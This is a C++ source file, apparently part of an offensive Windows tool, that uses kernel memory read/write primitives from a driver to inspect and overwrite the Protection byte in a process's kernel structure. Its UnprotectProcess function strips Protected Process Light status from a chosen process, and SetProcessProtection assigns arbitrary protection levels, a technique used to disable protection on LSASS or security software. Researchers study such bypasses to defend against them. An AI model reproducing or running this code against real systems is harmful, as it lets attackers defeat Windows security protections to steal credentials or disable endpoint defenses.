#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include "DriverOps.h"
#include "FindOffset.h"
#include "DisablePPL.h"

UCHAR GetProtectionLevel(UCHAR Protection)
{
    return Protection & 0x07;
}

UCHAR GetProtection(UCHAR ProtectionLevel, UCHAR SignerType)
{
    return ((UCHAR)SignerType << 4) | (UCHAR)ProtectionLevel;
}

LPCWSTR GetProtectionLevelAsString(UCHAR ProtectionLevel)
{
    switch (ProtectionLevel)
    {
    case PsProtectedTypeNone:
        return L"None";
    case PsProtectedTypeProtectedLight:
        return L"PPL";
    case PsProtectedTypeProtected:
        return L"PP";
    }

    return L"Unknown";
}

LPCWSTR GetSignerTypeAsString(UCHAR SignerType)
{
    switch (SignerType)
    {
    case PsProtectedSignerNone:
        return L"None";
    case PsProtectedSignerAuthenticode:
        return L"Authenticode";
    case PsProtectedSignerCodeGen:
        return L"CodeGen";
    case PsProtectedSignerAntimalware:
        return L"Antimalware";
    case PsProtectedSignerLsa:
        return L"Lsa";
    case PsProtectedSignerWindows:
        return L"Windows";
    case PsProtectedSignerWinTcb:
        return L"WinTcb";
    case PsProtectedSignerWinSystem:
        return L"WinSystem";
    case PsProtectedSignerApp:
        return L"App";
    }

    return L"Unknown";
}


LPCWSTR GetSignatureLevelAsString(UCHAR SignatureLevel)
{
    UCHAR bSignatureLevel;

    bSignatureLevel = SignatureLevel & 0x0f; // Remove additional flags

    switch (bSignatureLevel)
    {
        case SE_SIGNING_LEVEL_UNCHECKED:
            return L"Unchecked";
        case SE_SIGNING_LEVEL_UNSIGNED:
            return L"Unsigned";
        case SE_SIGNING_LEVEL_ENTERPRISE:
            return L"Enterprise";
        case SE_SIGNING_LEVEL_DEVELOPER:
            return L"Developer";
        case SE_SIGNING_LEVEL_AUTHENTICODE:
            return L"Authenticode";
        case SE_SIGNING_LEVEL_CUSTOM_2:
            return L"Custom2";
        case SE_SIGNING_LEVEL_STORE:
            return L"Store";
        case SE_SIGNING_LEVEL_ANTIMALWARE:
            return L"Antimalware";
        case SE_SIGNING_LEVEL_MICROSOFT:
            return L"Microsoft";
        case SE_SIGNING_LEVEL_CUSTOM_4:
            return L"Custom4";
        case SE_SIGNING_LEVEL_CUSTOM_5:
            return L"Custom5";
        case SE_SIGNING_LEVEL_DYNAMIC_CODEGEN:
            return L"DynamicCodegen";
        case SE_SIGNING_LEVEL_WINDOWS:
            return L"Windows";
        case SE_SIGNING_LEVEL_CUSTOM_7:
            return L"Custom7";
        case SE_SIGNING_LEVEL_WINDOWS_TCB:
            return L"WindowsTcb";
        case SE_SIGNING_LEVEL_CUSTOM_6:
            return L"Custom6";
    }

    printf("Failed to retrieve the Signature level associated to the value 0x%02x\n", SignatureLevel);

    return L"Unknown";
}

UCHAR GetSignerType(UCHAR Protection)
{
    return (Protection & 0xf0) >> 4;
}

UCHAR GetProtectionLevelFromString(LPCWSTR ProtectionLevel)
{
    if (ProtectionLevel)
    {
        if (!_wcsicmp(ProtectionLevel, L"PP"))
            return PsProtectedTypeProtected;
        else if (!_wcsicmp(ProtectionLevel, L"PPL"))
            return PsProtectedTypeProtectedLight;
    }

    printf("Failed to retrieve the value of the Protection level '%ws'\n", ProtectionLevel);

    return 0;
}


UCHAR GetSignatureLevel(UCHAR SignerType)
{
    // https://www.alex-ionescu.com/?p=146
    switch (SignerType)
    {
    case PsProtectedSignerNone:
        return SE_SIGNING_LEVEL_UNCHECKED;
    case PsProtectedSignerAuthenticode:
        return SE_SIGNING_LEVEL_AUTHENTICODE;
    case PsProtectedSignerCodeGen:
        return SE_SIGNING_LEVEL_DYNAMIC_CODEGEN;
    case PsProtectedSignerAntimalware:
        return SE_SIGNING_LEVEL_ANTIMALWARE;
    case PsProtectedSignerLsa:
        return SE_SIGNING_LEVEL_WINDOWS;
    case PsProtectedSignerWindows:
        return SE_SIGNING_LEVEL_WINDOWS;
    case PsProtectedSignerWinTcb:
        return SE_SIGNING_LEVEL_WINDOWS_TCB;
    }

    printf("Failed to retrieve the Signature level associated to the Signer type value %d\n", SignerType);

    return 0xff;
}

UCHAR GetSignerTypeFromString(LPCWSTR SignerType)
{
    if (SignerType)
    {
        if (!_wcsicmp(SignerType, L"Authenticode"))
            return PsProtectedSignerAuthenticode;
        else if (!_wcsicmp(SignerType, L"CodeGen"))
            return PsProtectedSignerCodeGen;
        else if (!_wcsicmp(SignerType, L"Antimalware"))
            return PsProtectedSignerAntimalware;
        else if (!_wcsicmp(SignerType, L"Lsa"))
            return PsProtectedSignerLsa;
        else if (!_wcsicmp(SignerType, L"Windows"))
            return PsProtectedSignerWindows;
        else if (!_wcsicmp(SignerType, L"WinTcb"))
            return PsProtectedSignerWinTcb;
        else if (!_wcsicmp(SignerType, L"WinSystem"))
            return PsProtectedSignerWinSystem;
        else if (!_wcsicmp(SignerType, L"App"))
            return PsProtectedSignerApp;
    }

    printf("Failed to retrieve the value of the Signer type '%ws'\n", SignerType);

    return 0;
}

BOOL GetProcessProtectionFromAddress(ULONG_PTR Addr, PUCHAR Protection)
{
    UCHAR bProtection;

    if(!Read8(Addr + GetOffsets().ProtectionOffset, &bProtection))
    {
#ifdef _WIN64
        printf("Failed to retrieve Protection attribute of process @ 0x%016llx\n", Addr);
#else
        printf("Failed to retrieve Protection attribute of process @ 0x%08x\n", Addr);
#endif
        return FALSE;
    }

    *Protection = bProtection;

    return TRUE;
}


BOOL GetProcessSignatureLevelFromAddress(ULONG_PTR Addr, PUCHAR SignatureLevel)
{

    UCHAR bSignatureLevel;

    if(!Read8(Addr + GetOffsets().SignatureLevelOffset, &bSignatureLevel))
    {
#ifdef _WIN64
        printf("Failed to retrieve SignatureLevel attribute of process @ 0x%016llx\n", Addr);
#else
        printf("Failed to retrieve SignatureLevel attribute of process @ 0x%08x\n", Addr);
#endif
        return FALSE;
    }
    *SignatureLevel = bSignatureLevel;

    return TRUE;
}


BOOL GetProcessProtection(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;
    UCHAR bProtectionLevel, bSignerType;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtectionFromAddress(pProcess, &bProtection))
        return FALSE;

    if (bProtection > 0)
    {
        bProtectionLevel = GetProtectionLevel(bProtection);
        bSignerType = GetSignerType(bProtection);

        printf("The process with PID %d is a %ws with the Signer type '%ws' (%d)\n",
            Pid,
            GetProtectionLevelAsString(bProtectionLevel),
            GetSignerTypeAsString(bSignerType),
            bSignerType
        );
    }
    else
    {
        printf("The process with PID %d is not protected\n", Pid);
    }

    return TRUE;
}


BOOL SetProcessProtection(DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bProtectionOld, bProtectionNew, bProtectionEffective;
    UCHAR bProtectionLevel, bSignerType;

    if (!(bProtectionLevel = GetProtectionLevelFromString(ProtectionLevel)))
        return FALSE;

    if (!(bSignerType = GetSignerTypeFromString(SignerType)))
        return FALSE;

    bProtectionNew = GetProtection(bProtectionLevel, bSignerType);

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtectionFromAddress(pProcess, &bProtectionOld))
        return FALSE;

    if (bProtectionOld == bProtectionNew)
    {
        printf("The process with PID %d already has the protection '%ws-%ws'\n",
            Pid,
            GetProtectionLevelAsString(GetProtectionLevel(bProtectionOld)),
            GetSignerTypeAsString(GetSignerType(bProtectionOld))
        );

        return FALSE;
    }

    if (!SetProcessProtectionFromAddress(pProcess, bProtectionNew))
    {
        printf("Failed to set Protection '%ws-%ws' on process with PID %d\n",
            GetProtectionLevelAsString(bProtectionLevel),
            GetSignerTypeAsString(bSignerType),
            Pid
        );

        return FALSE;
    }

    if (!GetProcessProtectionFromAddress(pProcess, &bProtectionEffective))
        return FALSE;

    if (bProtectionNew != bProtectionEffective)
    {
        printf("Tried to set the protection '%ws-%ws', but the effective protection is: '%ws-%ws'\n",
            GetProtectionLevelAsString(bProtectionLevel),
            GetSignerTypeAsString(bSignerType),
            GetProtectionLevelAsString(GetProtectionLevel(bProtectionEffective)),
            GetSignerTypeAsString(GetSignerType(bProtectionEffective))
        );

        return FALSE;
    }

    printf("The Protection '%ws-%ws' was set on the process with PID %d, previous protection was: '%ws-%ws'\n",
        GetProtectionLevelAsString(bProtectionLevel),
        GetSignerTypeAsString(bSignerType),
        Pid,
        GetProtectionLevelAsString(GetProtectionLevel(bProtectionOld)),
        GetSignerTypeAsString(GetSignerType(bProtectionOld))
    );

    return TRUE;
}

BOOL UnprotectProcess(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtectionFromAddress(pProcess, &bProtection))
        return FALSE;

    if (bProtection == 0)
    {
        printf("The process with PID %d is not protected, nothing to unprotect\n", Pid);
        return FALSE;
    }

    if (!SetProcessProtectionFromAddress(pProcess, 0))
    {
        printf("Failed to set Protection level 'None' and Signer type 'None' on process with PID %d\n", Pid);
        return FALSE;
    }

    if (!GetProcessProtectionFromAddress(pProcess, &bProtection))
        return FALSE;

    if (bProtection != 0)
    {
        printf("The process with PID %d still appears to be protected\n", Pid);
        return FALSE;
    }

    printf("The process with PID %d is no longer a PP(L)\n", Pid);

    return TRUE;
}

BOOL SetProcessProtectionFromAddress(ULONG_PTR Addr, UCHAR Protection)
{
    return Write8(Addr + GetOffsets().ProtectionOffset, Protection);
}

